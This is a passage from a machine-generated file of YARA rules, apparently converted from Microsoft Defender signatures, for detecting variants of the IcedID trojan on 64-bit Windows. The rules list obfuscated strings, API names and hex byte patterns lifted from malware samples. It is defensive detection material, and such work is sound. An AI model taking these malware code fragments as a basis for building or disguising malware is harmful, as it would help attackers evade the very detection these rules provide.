        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAT_2147829672_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAT!MTB"
        threat_id = "2147829672"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ypolytrew" ascii //weight: 1
        $x_1_2 = "BIbpe4sWIM0a" ascii //weight: 1
        $x_1_3 = "Cg9g6ihrsx1e" ascii //weight: 1
        $x_1_4 = "LXBBhkEasXYYIFZb" ascii //weight: 1
        $x_1_5 = "MvaR5FBTYcT54wM" ascii //weight: 1
        $x_1_6 = "RrpBMttapguGqE6" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BD_2147829716_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BD!MSR"
        threat_id = "2147829716"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "AoxVGxUhMS37u5" ascii //weight: 2
        $x_2_2 = "DSvWjcLn0t" ascii //weight: 2
        $x_2_3 = "H6smkoCwIn" ascii //weight: 2
        $x_2_4 = "Ku2EqA1" ascii //weight: 2
        $x_2_5 = "P53gvs" ascii //weight: 2
        $x_2_6 = "YXSBwE8dqvY" ascii //weight: 2
        $x_2_7 = "gEz7xYuQo" ascii //weight: 2
        $x_2_8 = "liizVFQ" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EA_2147829747_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EA!MTB"
        threat_id = "2147829747"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_4_1 = {48 89 54 24 10 48 89 4c 24 08 eb d7 80 44 24 4b 28 c6 44 24 4c 4e eb 00 80 44 24 4c 26 c6 44 24 4d 62 eb 18 44 89 4c 24 20 4c 89 44 24 18 eb d0 80 44 24 4a 07 c6 44 24 4b 4a eb d0}  //weight: 4, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EA_2147829747_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EA!MTB"
        threat_id = "2147829747"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {44 89 4c 24 20 4c 89 44 24 18 eb ?? 80 44 24 ?? ?? c6 44 24 ?? ?? eb ?? 80 44 24 ?? ?? c6 44 24 ?? ?? eb ?? 80 44 24 ?? ?? c6 44 24 ?? ?? eb}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EA_2147829747_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EA!MTB"
        threat_id = "2147829747"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_4_1 = {44 89 4c 24 20 4c 89 44 24 18 eb 59 80 44 24 42 24 c6 44 24 43 4d eb dc 48 81 ec 88 08 00 00 c6 44 24 40 76 eb 0c 80 44 24 45 43 c6 44 24 46 0d eb 0c 80 44 24 40 00 c6 44 24 41 5b eb 1b}  //weight: 4, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EA_2147829747_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EA!MTB"
        threat_id = "2147829747"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "hbksajnahbsfjaksfnhbaksf" ascii //weight: 10
        $x_10_2 = "urhjbtneksubashdajksdas" ascii //weight: 10
        $x_1_3 = {10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_EA_2147829747_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EA!MTB"
        threat_id = "2147829747"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "yibhasnduybasodmjnuhyasdjasa" ascii //weight: 5
        $x_5_2 = "uasifbyugashfjakshbass" ascii //weight: 5
        $x_1_3 = "WaitForSingleObject" ascii //weight: 1
        $x_1_4 = "CreateEventW" ascii //weight: 1
        $x_1_5 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_EA_2147829747_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EA!MTB"
        threat_id = "2147829747"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "yausgbfatsduhasdajdhaysudjas" ascii //weight: 5
        $x_5_2 = "ajiosduahygsdahiiskas" ascii //weight: 5
        $x_5_3 = "uasifbyugashfjakshbass" ascii //weight: 5
        $x_1_4 = "WaitForSingleObject" ascii //weight: 1
        $x_1_5 = "CreateEventW" ascii //weight: 1
        $x_1_6 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_B_2147829808_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.B!MTB"
        threat_id = "2147829808"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "jWqvH.dll" ascii //weight: 1
        $x_1_2 = "HVMCzOZVmAxK4oafNt" ascii //weight: 1
        $x_1_3 = "rmck6ynwyfY4N6IInEB" ascii //weight: 1
        $x_1_4 = "Ly2Fk3jF6pfbPbLPcm0YlL" ascii //weight: 1
        $x_1_5 = "M2z5inE8eWhR71Jl726t" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_B_2147829808_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.B!MTB"
        threat_id = "2147829808"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GUjabhsufyuaskjnakskfjsa" ascii //weight: 1
        $x_1_2 = "AiirnHP6wpnodHxlvEH8" ascii //weight: 1
        $x_1_3 = "G5LokqyPCTQIgY0jzlPMckfpx" ascii //weight: 1
        $x_1_4 = "YUwmcPlGB1GS8B8kxGb" ascii //weight: 1
        $x_1_5 = "fzlCP2tWvC8jOxHvdx" ascii //weight: 1
        $x_1_6 = "s4gSoYivIkvEKa9e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_FB_2147829909_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.FB!MTB"
        threat_id = "2147829909"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ewuijkamdsjuija" ascii //weight: 1
        $x_1_2 = "fTmvADKQ" ascii //weight: 1
        $x_1_3 = "g9Xc6os9KL" ascii //weight: 1
        $x_1_4 = "iN8sM8t" ascii //weight: 1
        $x_1_5 = "lau02s17" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_FB_2147829909_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.FB!MTB"
        threat_id = "2147829909"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {3a c0 74 d8 44 89 4c 24 20 4c 89 44 24 18 66 3b d2 74 12 83 44 24 40 08 c7 44 24 44 1b 00 00 00 66 3b f6 74 a5 48 89 54 24 10 48 89 4c 24 08 3a e4 74 00 48 81 ec 68 02 00 00 c7 44 24 30 6e 00 00 00 3a ed 0f 84 4c ff ff ff}  //weight: 3, accuracy: High
        $x_2_2 = "ntagshjjashgdaa" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_FB_2147829909_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.FB!MTB"
        threat_id = "2147829909"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Cw7K50jmlwWO7MJR8DD7HVLpaU" ascii //weight: 1
        $x_1_2 = "GUjabhsufyuaskjnakskfjsa" ascii //weight: 1
        $x_1_3 = "JWnfn3XvluccSKlH6jdGKofC23l" ascii //weight: 1
        $x_1_4 = "KHIkLkXtoLmaftCQIF6i8Gl" ascii //weight: 1
        $x_1_5 = "KYAthbddOxTbalQhjC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAU_2147829934_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAU!MTB"
        threat_id = "2147829934"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {eb 00 4c 89 44 24 18 89 54 24 10 3a f6 74 ?? b8 01 00 00 00 83 c0 00 eb ?? 48 83 c4 18 c3}  //weight: 1, accuracy: Low
        $x_1_2 = "kfuasgydhusadkasd" ascii //weight: 1
        $x_1_3 = "CtjBUOHiiKhWxczP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAV_2147829935_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAV!MTB"
        threat_id = "2147829935"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ntugjhshagsdmajh" ascii //weight: 1
        $x_1_2 = "AoxVGxUhMS37u5" ascii //weight: 1
        $x_1_3 = "DSvWjcLn0t" ascii //weight: 1
        $x_1_4 = "H6smkoCwIn" ascii //weight: 1
        $x_1_5 = "YXSBwE8dqvY" ascii //weight: 1
        $x_1_6 = "gEz7xYuQo" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAV_2147829935_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAV!MTB"
        threat_id = "2147829935"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 83 c0 04 8b 83 ?? ?? ?? ?? 33 43 ?? 83 f0 ?? 89 43 0c 8b 83 ?? ?? ?? ?? 83 e8 ?? 31 43 ?? b8 ?? ?? ?? ?? 2b 83 ?? ?? ?? ?? 01 43 ?? 8b 4b ?? 44 89 8b ?? ?? ?? ?? 8d 81 ?? ?? ?? ?? 8b 8b ?? ?? ?? ?? 31 43 ?? 2b 4b ?? 8b 43 ?? 81 c1 ?? ?? ?? ?? 2d ?? ?? ?? ?? 0f af c8 89 8b ?? ?? ?? ?? 8b 83 ?? ?? ?? ?? 01 43 ?? 49 81 f8 ?? ?? ?? ?? 7c}  //weight: 1, accuracy: Low
        $x_1_2 = "CellClearImm" ascii //weight: 1
        $x_1_3 = "Hcrza4h2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DIE_2147829970_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DIE!MTB"
        threat_id = "2147829970"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b 84 24 ?? ?? ?? ?? 48 8b 08 66 3b c0}  //weight: 1, accuracy: Low
        $x_1_2 = {48 89 44 24 ?? 33 d2 66 3b d2}  //weight: 1, accuracy: Low
        $x_1_3 = {c7 84 24 ac 00 00 00 0f 00 00 00 83 84 24 ac 00 00 00 11}  //weight: 1, accuracy: High
        $x_1_4 = {c7 84 24 b0 00 00 00 2e 00 00 00 83 84 24 b0 00 00 00 20}  //weight: 1, accuracy: High
        $x_1_5 = {44 89 4c 24 20 4c 89 44 24 18 3a c0}  //weight: 1, accuracy: High
        $x_1_6 = {83 84 24 c0 02 00 00 4d c7 84 24 c4 02 00 00 28 00 00 00 66 3b c9}  //weight: 1, accuracy: High
        $x_1_7 = {8b 84 24 58 01 00 00 89 84 24 d0 00 00 00 66 3b e4}  //weight: 1, accuracy: High
        $x_1_8 = {c7 84 24 b0 00 00 00 01 00 00 00 83 84 24 b0 00 00 00 00 3a db}  //weight: 1, accuracy: High
        $x_1_9 = {eb f5 eb 00 b8 01 00 00 00 83 c0 00 eb 00 c3 eb 01 c3 b8 01 00 00 00 83 c0 00 eb f5 eb 00 b8 01 00 00 00 83 c0 00 eb 00 c3 eb 00 b8 01}  //weight: 1, accuracy: High
        $x_1_10 = {8b 44 84 60 b9 01 00 00 00 3a e4 ?? ?? 48 63 4c 24 20 89 44 8c 60}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Trojan_Win64_IcedID_DJY_2147829974_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DJY!MTB"
        threat_id = "2147829974"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "AouaCATRtk" ascii //weight: 5
        $x_5_2 = "Hghcgxashfgfsfgdf" ascii //weight: 5
        $x_3_3 = "IaUb7d6cnUh1v" ascii //weight: 3
        $x_3_4 = "GYfAgteqcLCLd" ascii //weight: 3
        $x_1_5 = "OzXGNp" ascii //weight: 1
        $x_1_6 = "LeRVII6YmxsHlQ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_3_*) and 1 of ($x_1_*))) or
            ((1 of ($x_5_*) and 2 of ($x_3_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MAW_2147829975_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAW!MTB"
        threat_id = "2147829975"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CO2BMRaN83Dwheip5yrtWyttaXd9H" ascii //weight: 1
        $x_1_2 = "GGuhnjasbuhbasjansj" ascii //weight: 1
        $x_1_3 = "GneNsXu74YG47f8BKh7J4FiYD1" ascii //weight: 1
        $x_1_4 = "HJT1pX9lELy88TXOnK5bhOBdd" ascii //weight: 1
        $x_1_5 = "HbVQu5jPjxdytGTpNM8PPycNMhB" ascii //weight: 1
        $x_1_6 = "HxFrOCfWNZvSldZ9y3DAlfEnK" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_F_2147829985_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.F!MTB"
        threat_id = "2147829985"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {48 83 c0 02 48 89 44 24 40 e9 30 04 00 00 8a 40 01 88 44 24 21 66 3b d2 74 1a 48 03 c8 48 8b c1 66 3b ed 74 e9}  //weight: 3, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_F_2147829985_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.F!MTB"
        threat_id = "2147829985"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "yasfuhkasfiajskf" ascii //weight: 1
        $x_1_2 = "glyph-arrow-html" ascii //weight: 1
        $x_1_3 = ".shtll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_F_2147829985_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.F!MTB"
        threat_id = "2147829985"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {48 8b 44 24 38 48 8b 4c 24 40 e9 57 01 00 00 8a 00 88 44 24 20 eb e9 48 8b 44 24 38 48 8b 4c 24 40 66 3b db 74 00 48 03 c8 48 8b c1 3a db 74 df}  //weight: 3, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_F_2147829985_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.F!MTB"
        threat_id = "2147829985"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8a 40 01 88 44 24 21 3a ff 74}  //weight: 1, accuracy: High
        $x_1_2 = {48 03 c8 48 8b c1 66 3b ?? 74}  //weight: 1, accuracy: Low
        $x_1_3 = {48 8b 44 24 40 48 8b 4c 24 48 66 3b ?? 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DJZ_2147830021_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DJZ!MTB"
        threat_id = "2147830021"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {0f 10 84 24 b0 01 00 00 f3 0f 7f 84 24 e0 01 00 00 [0-3] 74}  //weight: 5, accuracy: Low
        $x_1_2 = {af 26 00 00 49 83 ce 0f 48 81 ee dd 26 00 00 49 f7 d1 49 f7 c1 45 07 00 00 4d 33 c0 49 81 c9 f5 1c 00 00 48 81 c4 5c 05 00 00 48 0f a4 fa 2a 48 0f a4 d6 04 e4 50 4d 0f ac f4 a9 49 c1 e4 a9}  //weight: 1, accuracy: High
        $x_1_3 = {48 81 d7 c7 06 00 00 49 81 ea 0d 14 00 00 49 81 dc fb 06 00 00 48 f7 fb 48 69 f6 d4 22 00 00 48 81 dd fb 22 00 00 48 f7 c2 f3 17 00 00 49 13 d4 49 ff cb 48 33 e4 4d 0f a4 de 7c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_AQ_2147830041_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AQ!MTB"
        threat_id = "2147830041"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "B65V7glqEqi9jjuyMLI" ascii //weight: 1
        $x_1_2 = "ECsUqxuH3Wk1UkNPROJIZj" ascii //weight: 1
        $x_1_3 = "NbOAC80chptanue1XYL" ascii //weight: 1
        $x_1_4 = "Orm15XdrxN8edqNTvqCOcat0r" ascii //weight: 1
        $x_1_5 = "R2D7w6tP48mDyat4AvMPre4f9r8ZX" ascii //weight: 1
        $x_1_6 = "TpySrkVdivDzIXx519Mo" ascii //weight: 1
        $x_1_7 = "UFCX77245ib6jzn91Ov" ascii //weight: 1
        $x_1_8 = "Vjem0knHWuGYqYBWIrWFa7VrF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AR_2147830047_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AR!MTB"
        threat_id = "2147830047"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VyghdshuygtfyGHjsdbfkbhsguasjs" ascii //weight: 1
        $x_1_2 = "AcIgepg8pGSB93cPal7y" ascii //weight: 1
        $x_1_3 = "KTv9HLomXWnLdNpCrAukyHPuRdcAZp" ascii //weight: 1
        $x_1_4 = "KccsAJJgAzb6WJw1PqUB" ascii //weight: 1
        $x_1_5 = "NX6uBGL8iXkYlvDVo3kDypgFtZqffr4" ascii //weight: 1
        $x_1_6 = "O2hGmnaXy75sOqhcuSNFqC" ascii //weight: 1
        $x_1_7 = "OMR34oBeRPIAqdKHMExRbyEp" ascii //weight: 1
        $x_1_8 = "SNPK86QvYys5Uhbbbs8fx2" ascii //weight: 1
        $x_1_9 = "VhasgJHASbhfnhbjkasnbsabhs" ascii //weight: 1
        $x_1_10 = "Bwtw8u4lNCG8cycow1v1xqEcx9a" ascii //weight: 1
        $x_1_11 = "CyOJiJAEScVK1pf2np" ascii //weight: 1
        $x_1_12 = "D2fvm9xu679pKsc6X" ascii //weight: 1
        $x_1_13 = "E4y68iRzZ1Oi2hydBHZxQXQlgNfs2" ascii //weight: 1
        $x_1_14 = "FDws2tostGjZEZetGmnM" ascii //weight: 1
        $x_1_15 = "NWCSn4Q9UL5eauHq9GxNy5" ascii //weight: 1
        $x_1_16 = "WYk9FXZJ1Hxv44ajR30ePs2SRjQeV" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (8 of ($x*))
}

rule Trojan_Win64_IcedID_AS_2147830055_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AS!MTB"
        threat_id = "2147830055"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VyghdshuygtfyGHjsdbfkbhsguasjs" ascii //weight: 1
        $x_1_2 = "BMzyvdAKBlpW6GYgN5Wr" ascii //weight: 1
        $x_1_3 = "DSWUuBZt6QIi3lP1GxC83Pb" ascii //weight: 1
        $x_1_4 = "JYbhEAmfTrgrD6qSiGESHlPQ" ascii //weight: 1
        $x_1_5 = "PkxBH7HkkCLLjmLp9" ascii //weight: 1
        $x_1_6 = "UBPt79xRV3EjaSkbERC8tFk2qfhLXUD" ascii //weight: 1
        $x_1_7 = "V9kH7W6irvyqy8KEK" ascii //weight: 1
        $x_1_8 = "Yyci5mgmfxMNczkbA22EfKb" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AT_2147830132_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AT!MTB"
        threat_id = "2147830132"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BSeGhKbGqPJB9oSc9T1Z" ascii //weight: 1
        $x_1_2 = "BuSZrL3Hj61INtDu0ZA3MmZpZ" ascii //weight: 1
        $x_1_3 = "CAU1JHv14IQDroozCqQc9X" ascii //weight: 1
        $x_1_4 = "CWKlSjhL1OiEmEAPVxugoc55r99A6DX" ascii //weight: 1
        $x_1_5 = "J0QmVbkccN1OoC8ZBoaN7Y9qwjN6q" ascii //weight: 1
        $x_1_6 = "Mb8jcuNhOWH0NScN8Sl6tIFd3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_C_2147830170_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.C!MTB"
        threat_id = "2147830170"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "jlqed6.dll" ascii //weight: 1
        $x_1_2 = "CQXpH1E3VbkvEYOzTN2v" ascii //weight: 1
        $x_1_3 = "Cz3g0yuJLX9B1xUP9AVK" ascii //weight: 1
        $x_1_4 = "GIHgbjhasdvgvasdhjkaj" ascii //weight: 1
        $x_1_5 = "J7ZLh5ua6zJ5PV3Q" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_7_1 = {8b c2 48 8d 49 01 83 e0 07 ff c2 0f b6 44 30 10 30 41 ff}  //weight: 7, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
